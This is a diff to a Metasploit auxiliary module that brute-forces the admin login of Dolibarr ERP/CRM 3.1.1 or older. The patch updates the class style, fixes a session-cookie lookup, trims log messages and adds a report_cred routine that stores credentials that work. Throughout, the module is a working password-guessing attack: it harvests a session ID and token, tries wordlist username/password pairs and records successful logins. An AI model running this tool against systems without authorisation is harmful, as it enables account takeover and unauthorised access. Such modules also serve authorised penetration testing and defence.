@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::AuthBrute
@@ -18,7 +15,7 @@ class Metasploit3 < Msf::Auxiliary
       'Description'    => %q{
         This module attempts to authenticate to a Dolibarr ERP/CRM's admin web interface,
         and should only work against version 3.1.1 or older, because these versions do not
-        have any default protections against bruteforcing.
+        have any default protections against brute forcing.
       },
       'Author'         => [ 'sinn3r' ],
       'License'        => MSF_LICENSE
@@ -33,7 +30,7 @@ class Metasploit3 < Msf::Auxiliary
         OptPath.new('PASS_FILE',  [ false, "File containing passwords, one per line",
           File.join(Msf::Config.data_directory, "wordlists", "http_default_pass.txt") ]),
         OptString.new('TARGETURI', [true, 'The URI path to dolibarr', '/dolibarr/'])
-      ], self.class)
+      ])
   end
 
 
@@ -46,7 +43,7 @@ class Metasploit3 < Msf::Auxiliary
     return [nil, nil] if res.nil? || res.get_cookies.empty?
 
     # Get the session ID from the cookie
-    m = get_cookies.match(/(DOLSESSID_.+);/)
+    m = res.get_cookies.match(/(DOLSESSID_.+);/)
     id = (m.nil?) ? nil : m[1]
 
     # Get the token from the decompressed HTTP body response
@@ -56,6 +53,33 @@ class Metasploit3 < Msf::Auxiliary
     return id, token
   end
 
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: (ssl ? 'https' : 'http'),
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      origin_type: :service,
+      module_fullname: fullname,
+      username: opts[:user],
+      private_data: opts[:password],
+      private_type: :password
+    }.merge(service_data)
+
+    login_data = {
+      last_attempted_at: DateTime.now,
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::SUCCESSFUL,
+      proof: opts[:proof]
+    }.merge(service_data)
+
+    create_credential_login(login_data)
+  end
+
   def do_login(user, pass)
     #
     # Get a new session ID/token.  That way if we get a successful login,
@@ -63,11 +87,11 @@ class Metasploit3 < Msf::Auxiliary
     #
     sid, token = get_sid_token
     if sid.nil? or token.nil?
-      vprint_error("#{peer} - Unable to obtain session ID or token, cannot continue")
+      vprint_error("Unable to obtain session ID or token, cannot continue")
       return :abort
     else
-      vprint_status("#{peer} - Using sessiond ID: #{sid}")
-      vprint_status("#{peer} - Using token: #{token}")
+      vprint_status("Using sessiond ID: #{sid}")
+      vprint_status("Using token: #{token}")
     end
 
     begin
@@ -87,30 +111,22 @@ class Metasploit3 < Msf::Auxiliary
         }
       })
     rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
-      vprint_error("#{peer} - Service failed to respond")
+      vprint_error("Service failed to respond")
       return :abort
     end
 
     if res.nil?
-      vprint_error("#{peer} - Connection timed out")
+      vprint_error("Connection timed out")
       return :abort
     end
 
     location = res.headers['Location']
     if res and res.headers and (location = res.headers['Location']) and location =~ /admin\//
-      print_good("#{peer} - Successful login: \"#{user}:#{pass}\"")
-      report_auth_info({
-        :host        => rhost,
-        :port        => rport,
-        :sname       => (ssl ? 'https' : 'http'),
-        :user        => user,
-        :pass        => pass,
-        :proof       => location,
-        :source_type => 'user_supplied'
-      })
+      print_good("Successful login: \"#{user}:#{pass}\"")
+      report_cred(ip: rhost, port: rport, user: user, password: pass, proof: res.headers['Location'])
       return :next_user
     else
-      vprint_error("#{peer} - Bad login: \"#{user}:#{pass}\"")
+      vprint_error("Bad login: \"#{user}:#{pass}\"")
       return
     end
   end
@@ -124,7 +140,7 @@ class Metasploit3 < Msf::Auxiliary
 
   def run_host(ip)
     each_user_pass { |user, pass|
-      vprint_status("#{peer} - Trying \"#{user}:#{pass}\"")
+      vprint_status("Trying \"#{user}:#{pass}\"")
       do_login(user, pass)
     }
   end
